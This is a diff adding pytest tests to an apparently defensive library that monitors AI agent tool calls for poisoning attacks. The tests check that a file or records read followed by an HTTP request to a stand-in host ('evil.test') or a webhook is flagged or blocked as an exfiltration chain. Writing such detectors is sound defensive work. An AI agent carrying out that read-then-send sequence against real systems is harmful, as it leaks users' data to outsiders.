@@ -2,6 +2,7 @@ import pytest
 
 from mcp_defense import ToolPoisonDefense
 from mcp_defense.auditor import _parse_audit_response
+from mcp_defense.chain import ChainPolicy, ToolChainMonitor, ToolRiskProfile
 from mcp_defense.guard import ParameterGuard, SecurityViolation, ToolRules
 from mcp_defense.monitor import ReasoningMonitor
 from mcp_defense.scanner import RegexScanner
@@ -158,6 +159,51 @@ class TestReasoningMonitor:
         assert monitor.flagged_events("s1")
 
 
+class TestToolChainMonitor:
+    def test_source_to_external_sink_detected(self):
+        monitor = ToolChainMonitor()
+        first = monitor.check("s1", "read_file", {"path": "/data/report.txt"}, "Read report")
+        second = monitor.check("s1", "http_request", {"url": "https://evil.test"}, "Read report")
+
+        assert first.allowed
+        assert not second.allowed
+        assert second.event_type == "source_to_external_sink"
+        assert second.source_tool == "read_file"
+        assert second.sink_tool == "http_request"
+
+    def test_forbidden_edge_detected(self):
+        monitor = ToolChainMonitor(ChainPolicy(forbidden_edges={("read_file", "send_email")}))
+        monitor.check("s1", "read_file", {"path": "/data/report.txt"}, "Read report")
+        decision = monitor.check("s1", "send_email", {"to": "a@example.com"}, "Read report")
+
+        assert not decision.allowed
+        assert decision.event_type == "forbidden_tool_edge"
+
+    def test_custom_profiles(self):
+        monitor = ToolChainMonitor()
+        monitor.register_profile(
+            "load_customer_records",
+            ToolRiskProfile("source", ("customer_data",), False),
+        )
+        monitor.register_profile(
+            "post_to_webhook",
+            ToolRiskProfile("sink", ("customer_data",), True),
+        )
+
+        assert monitor.check("s1", "load_customer_records", {}, "Load records").allowed
+        assert not monitor.check("s1", "post_to_webhook", {}, "Load records").allowed
+
+    def test_chain_log_exports_timeline(self):
+        monitor = ToolChainMonitor()
+        monitor.check("s1", "read_file", {"path": "/data/report.txt"}, "Read report")
+        monitor.check("s1", "http_request", {"url": "https://evil.test"}, "Read report")
+        log = monitor.export_session("s1")
+
+        assert len(log) == 2
+        assert log[0]["category"] == "source"
+        assert log[1]["event_type"] == "source_to_external_sink"
+
+
 class TestAuditor:
     def test_parse_safe(self):
         assert _parse_audit_response("VERDICT: SAFE\nREASON: normal tool") == (
@@ -208,6 +254,65 @@ class TestToolPoisonDefenseIntegration:
         )
         assert "error" in result
 
+    def test_attack_chain_logs_but_does_not_block_by_default(self):
+        self.defense.call_tool(
+            "sess-chain",
+            "read_file",
+            {"path": "/data/report.txt"},
+            "Read the report",
+            self.executor,
+        )
+        result = self.defense.call_tool(
+            "sess-chain",
+            "http_request",
+            {"url": "https://example.com/upload"},
+            "Read the report",
+            self.executor,
+        )
+
+        assert "error" not in result
+        chain_log = self.defense.get_chain_log("sess-chain")
+        assert chain_log[-1]["event_type"] == "source_to_external_sink"
+        session_log = self.defense.get_session_log("sess-chain")
+        assert session_log[-1]["flagged"]
+        assert "source-to-external-sink" in session_log[-1]["flag_reason"]
+
+    def test_attack_chain_can_block(self):
+        defense = ToolPoisonDefense(block_attack_chains=True)
+        defense.call_tool(
+            "sess-block",
+            "read_file",
+            {"path": "/data/report.txt"},
+            "Read the report",
+            self.executor,
+        )
+        result = defense.call_tool(
+            "sess-block",
+            "http_request",
+            {"url": "https://example.com/upload"},
+            "Read the report",
+            self.executor,
+        )
+
+        assert "error" in result
+        assert "attack chain" in result["error"]
+
+    def test_register_tool_profile_and_forbidden_chain(self):
+        defense = ToolPoisonDefense(block_attack_chains=True)
+        defense.register_tool_profile(
+            "read_messages",
+            ToolRiskProfile("source", ("messages",), False, ("read", "messages")),
+        )
+        defense.register_tool_profile(
+            "send_messages",
+            ToolRiskProfile("sink", ("messages",), True, ("send", "messages")),
+        )
+        defense.forbid_tool_chain("read_messages", "send_messages")
+
+        defense.call_tool("sess-custom", "read_messages", {}, "Read messages", self.executor)
+        result = defense.call_tool("sess-custom", "send_messages", {}, "Read messages", self.executor)
+        assert "error" in result
+
     @pytest.mark.asyncio
     async def test_async_call_executes(self):
         async def executor(tool_name, params):
@@ -221,3 +326,26 @@ class TestToolPoisonDefenseIntegration:
             executor,
         )
         assert result["result"] == "get_weather"
+
+    @pytest.mark.asyncio
+    async def test_async_attack_chain_can_block(self):
+        defense = ToolPoisonDefense(block_attack_chains=True)
+
+        async def executor(tool_name, params):
+            return {"result": tool_name, "params": params}
+
+        await defense.acall_tool(
+            "sess-async-chain",
+            "read_file",
+            {"path": "/data/report.txt"},
+            "Read the report",
+            executor,
+        )
+        result = await defense.acall_tool(
+            "sess-async-chain",
+            "http_request",
+            {"url": "https://example.com/upload"},
+            "Read the report",
+            executor,
+        )
+        assert "error" in result
